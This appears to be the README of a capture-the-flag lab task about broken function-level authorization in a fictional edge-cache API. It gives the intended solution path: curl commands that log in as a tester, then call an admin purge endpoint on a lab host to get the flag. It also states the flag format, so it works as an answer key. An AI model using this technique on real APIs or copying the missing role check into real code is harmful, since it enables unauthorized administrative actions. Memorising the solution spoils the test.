# api/bfla — Bfla (resource-resident, medium)

**PurgeHQ** edge-cache operations API. `POST /api/v1/admin/purge-cache` is an operator-only maintenance function that enforces **authentication** but never the **function-level authorization check** (role) — any signed-in account can invoke it, and the purge confirmation carries the flag.

Why exploitable: the route treats "logged in" as "allowed to administer" — authentication is used as a substitute for function-level authorization.

## Intended path
1. `curl -s -c jar -X POST -d 'username=0xnhsec&password=vlh-tester-01' http://victim.target.lab:8119/login`
2. Public status feed: `curl -s http://victim.target.lab:8119/api/v1/status`
3. Call the admin function as a plain tester: `curl -s -b jar -X POST http://victim.target.lab:8119/api/v1/admin/purge-cache` → `maintenance_note` holds the flag.

**Flag:** `DSLTV{API-Bfla-<9 digits>}` (in the purge response — server-side, behind the mis-authorized function only).
